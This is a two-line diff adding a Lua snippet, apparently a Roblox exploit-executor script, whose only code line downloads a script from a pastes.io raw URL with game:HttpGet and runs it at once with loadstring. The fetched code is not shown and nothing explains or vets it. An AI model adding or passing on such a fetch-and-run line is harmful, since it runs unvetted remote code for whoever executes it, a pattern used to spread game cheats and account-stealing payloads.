@@ -1,0 +1,2 @@
+-- Script :
+loadstring(game:HttpGet("https://pastes.io/raw/cbpgp7excr"))()
